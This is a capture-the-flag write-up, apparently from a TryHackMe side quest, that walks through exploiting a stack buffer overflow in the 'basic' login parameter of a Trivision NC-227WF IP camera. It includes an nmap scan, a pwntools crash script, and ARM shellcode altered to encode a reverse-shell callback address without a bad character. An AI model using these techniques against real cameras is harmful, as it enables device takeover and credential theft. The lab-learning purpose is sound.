# Exploiting-Trivision-NC-227WF-IP-Camera
Exploiting a buffer overflow vulnerability that exists in some brands of IP camera (TRYHACKME SIDE QUEST CHALLENGE).

We initially scan the ip address for ports to see what we have.
We notice that port 50628 is being used but what for?
At this point we just try it to see if it is running a web server but we can use an nmap scan to help identify the service.

sudo nmap -sS -A -p 50628   -v //returns some html (interesting).

When we access the web server we are greeted with the below ip camera login screen.

![image](https://github.com/Kenya123/Exploiting-Trivision-NC-227WF-IP-Camera/assets/41266003/85ff5f9c-30af-4a5b-8a87-95de9bb45814)















We try some default configurations but none work so we try researching to see if there are any known vulnerabilities.

This ip camera appears to be vulnerable to a buffer overflow vulnerability.

Vulnerability: If the url query contains the parameter 'basic' its value is copied byte by byte from the url
into a fixed 256byte buffer on the stack. If we send a value above 256bytes we are then able to overflow this buffer 
and begin writing to the stack as no length checks take place.

We are able to cause overflow using a simple script:

------ script to overflow  -------

from pwn import *
 
HOST = '<IP ADDRESS>'
PORT = 50628
 
buffer = cyclic(1000)
s = remote('<ip address>', 50628)
s.send(b'GET /en/login.asp?basic=' + buffer + b' HTTP/1.0\r\n\r\n')
s.close

------ script to overflow ------

This will cause a crash, however we want to do something more than that.
Since we can overwrite the stack we can essentially run our own shellcode which gives us a shell into the device.

Before I try to write my own shell code for this I search online to see if there are any examples.
I see an exploit in python which gains a reverse shell. The shellcode makes use of the bx sp rop gadget.

Technically at this point we can just go ahead and run this after replacing the ip addresses.
However, our ip address (thanks to tryhackme) contains the number 10 which is a bad character (0x0a).

We then have grab the shellcode which contains the ip address and disassemble it as below:

0x0000000000000000:  59 1F A0 E3    mov r1, #0x164 
0x0000000000000004:  01 14 A0 E1    lsl r1, r1, #8
0x0000000000000008:  A8 10 81 E2    add r1, r1, #0xa8
0x000000000000000c:  01 14 A0 E1    lsl r1, r1, #8
0x0000000000000010:  C0 10 81 E2    add r1, r1, #0xc0
0x0000000000000014:  04 10 2D E5    str r1, [sp, #-4]!

Our ip address is: 10.8.237.201 - so we change this assembly:

mov r1, #0xc9    //201
lsl r1, r1, #8
add r1, r1, #0xed //237
lsl r1, r1, #8
add r1, r1, #0x8 //8
lsl r1, r1, #8
add r1, r1, #0xb // 11
sub r1, r1, #1  // 11 - 1 = 10
str r1, [sp, #-4]! //store 10.8.237.201

As above we use a simple trick to avoid having to use 0x0a by using 11 then subtracting 1.
Once we run this the exploit should work and we should have a reverse shell.

We can then traverse the directories to find interesting config files allowing us to login to the ip camera.






